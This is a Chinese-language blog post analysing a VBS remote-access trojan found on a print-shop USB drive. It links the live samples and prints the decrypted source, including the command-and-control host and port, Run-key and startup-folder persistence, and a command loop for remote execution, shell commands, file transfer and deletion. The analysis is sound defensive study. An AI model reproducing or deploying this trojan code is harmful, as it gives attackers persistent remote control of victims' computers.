---
title: 打印店病毒分析 - VBS
category: Sec
---

## 打印店病毒分析 - VBS

样本仅供学习研究使用：

- [解密前]({{ site.url }}/resources/printer-virus/virus-0/vbs-virus-en.vbs.en.b64)
- [解密后]({{ site.url }}/resources/printer-virus/virus-0/vbs-virus-de.vbs.en.b64)

---

### 基本信息

这个恶意代码也是某次从打印店回来后在U盘里获得的。脚本语言写恶意程序，关键要骗过会查看源代码的用户。为此，作者进行了简单的加密处理。

VirSCAN.org在线测试：

解密前：

Scanner results:33%Scanner(s) (13/39)found malware  
File Name : vbs-virus-en.vbs.en.b64.vbs (File not down)  
File Size :209255 byte  
File Type :text/plain  
MD5:124bb52a16d3fceb3b66c00897b14f95  
SHA1:d83c5dae4ebc46383e686df8981259a654513c51  
[Online report](http://r.virscan.org/report/7143a9ae27122bc3eb13a70704b4a6fc)

解密后：

Scanner results:51%Scanner(s) (20/39)found malware!  
File Name : vbs-virus-de.vbs.en.b64.de.vbs (File not down)  
File Size :15064 byte  
File Type :text/plain  
MD5:459af2ecc630989d2e36228a3720aca4  
SHA1:d78cbaf3b3de8e57d6e8f2a25ed016894135f9d4  
[Online report](http://r.virscan.org/report/c5b17ed5482846db85fb9b50d1e8b8e7)

解密后的查出率高了不少。

### 代码分析

加密方法很简单。预先把代码分解成一个一个字符，运行时先拼凑出代码字符串，然后调用`executeglobal()`执行。解密思路很简单，把执行语句改成输出语句就行，重定向到文件里。

下面分析解密后的代码。

第一行，作者说自己是重写别人的代码，还留下了他的skype号......  
整体来看，作者编码习惯还是不错的。注释很到位。

首先是用于配置的一些变量：

{% highlight vb %}
host = "spamer01.no-ip.org"
port = 3344
installdir = "%temp%"
lnkfile = true
lnkfolder = true
{% endhighlight %}

看样子是个木马。

设置了一些变量，这些分别是创建出来的WshShell对象，文件系统对象，xmlhttp对象：

{% highlight vb %}
dim shellobj
set shellobj = wscript.createobject("wscript.shell")
dim filesystemobj
set filesystemobj = createobject("scripting.filesystemobject")
dim httpobj
set httpobj = createobject("msxml2.xmlhttp")
{% endhighlight %}

又设置了一些变量，其中：

`installname`存储它自己的名字；  
`startup`存储开机启动文件夹的路径；  
`installdir`内容变为存储之前`installdir`对应的环境变量的真实路径（上面作者预设的是`%temp%`）；  
接着检查上步得到的`installdir`路径是否存在，不存在则采用默认的`%temp%`（属于二次确认）；  
`spliter`内容是`<|>`估计是用来解析数据；  
`sleep`定义了睡眠时间是5000毫秒。  
还有一些其他变量，但没有具体初始化，到后面用到再说。

{% highlight vb %}
installname = wscript.scriptname
startup = shellobj.specialfolders ("startup") & "\"
installdir = shellobj.expandenvironmentstrings(installdir) & "\"
if not filesystemobj.folderexists(installdir) then  installdir = shellobj.expandenvironmentstrings("%temp%") & "\"
spliter = "<" & "|" & ">"
sleep = 5000
dim response
dim cmd
dim param
info = ""
usbspreading = ""
startdate = ""
dim oneonce
{% endhighlight %}

万事俱备，开始搞事情了。

首先是一句`on error resume next`，即当前语句执行出错时不要终止，而是执行下一条语句，在VBS里这条语句使用频率非常高。

接着调用`instance`函数,其功能是：



{% highlight vb %}
function instance

on error resume next
usbspreading = shellobj.regread ("HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0) & "\")

if usbspreading = "" then
   if lcase ( mid(wscript.scriptfullname,2)) = ":\" &  lcase(installname) then
      usbspreading = "true - " & date
      shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0)  & "\", usbspreading, "REG_SZ"
   else
      usbspreading = "false - " & date
      shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0)  & "\", usbspreading, "REG_SZ"
   end if
end If

upstart

set scriptfullnameshort =  filesystemobj.getfile (wscript.scriptfullname)
set installfullnameshort =  filesystemobj.getfile (installdir & installname)
if lcase (scriptfullnameshort.shortpath) <> lcase (installfullnameshort.shortpath) then
    shellobj.run "wscript.exe //B " & chr(34) & installdir & installname & Chr(34)
    wscript.quit
end If

err.clear
set oneonce = filesystemobj.opentextfile (installdir & installname ,8, false)
if  err.number > 0 then wscript.quit

end function
{% endhighlight %}

{% highlight vb %}
sub upstart ()

on error resume Next

shellobj.regwrite "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" & split (installname,".")(0),  "wscript.exe //B " & chrw(34) & installdir & installname & chrw(34) , "REG_SZ"

shellobj.regwrite "HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\" & split (installname,".")(0),  "wscript.exe //B "  & chrw(34) & installdir & installname & chrw(34) , "REG_SZ"

filesystemobj.copyfile wscript.scriptfullname,installdir & installname,true
filesystemobj.copyfile wscript.scriptfullname,startup & installname ,true

end sub
{% endhighlight %}

`instance`执行后，程序进入永真循环，逻辑很清晰。

{% highlight vb %}
while true
    install
    response = ""
    response = post ("is-ready","")
    cmd = split (response,spliter)
    select case cmd (0)
    case "excecute"
          param = cmd (1)
          execute param
    case "update"
          param = cmd (1)
          oneonce.close
          set oneonce =  filesystemobj.opentextfile (installdir & installname ,2, false)
          oneonce.write param
          oneonce.close
          shellobj.run "wscript.exe //B " & chr(34) & installdir & installname & chr(34)
          wscript.quit
    case "uninstall"
          uninstall
    case "send"
          download cmd (1),cmd (2)
    case "site-send"
          sitedownloader cmd (1),cmd (2)
    case "recv"
          param = cmd (1)
          upload (param)
    case  "enum-driver"
          post "is-enum-driver",enumdriver
    case  "enum-faf"
          param = cmd (1)
          post "is-enum-faf",enumfaf (param)
    case  "enum-process"
          post "is-enum-process",enumprocess
    case  "cmd-shell"
          param = cmd (1)
          post "is-cmd-shell",cmdshell (param)
    case  "delete"
          param = cmd (1)
          deletefaf (param)
    case  "exit-process"
          param = cmd (1)
          exitprocess (param)
    case  "sleep"
          param = cmd (1)
          sleep = eval (param)
    end select
	wscript.sleep sleep
wend
{% endhighlight %}

### 总结

作为一个远控，隐藏自己和完成命令同样重要。
